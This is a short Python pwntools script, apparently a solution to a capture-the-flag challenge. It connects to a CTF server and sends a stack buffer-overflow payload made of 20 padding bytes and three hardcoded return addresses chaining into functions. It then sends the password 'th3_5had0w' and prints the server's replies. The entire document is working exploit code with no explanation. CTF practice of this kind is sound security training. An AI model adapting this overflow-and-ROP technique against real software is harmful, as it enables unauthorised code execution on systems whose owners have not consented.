from pwn import *

payload = 'A'*20+p64(0x4007e7)+p64(0x400801)+p64(0x400846)

p = remote('pwn.hsctf.com', 5005)
print p.recvuntil(': ')
p.sendline(payload)
print p.recv()
print p.recv()
print p.recv()
p.sendline('th3_5had0w')
print p.recv()
print p.recvall()
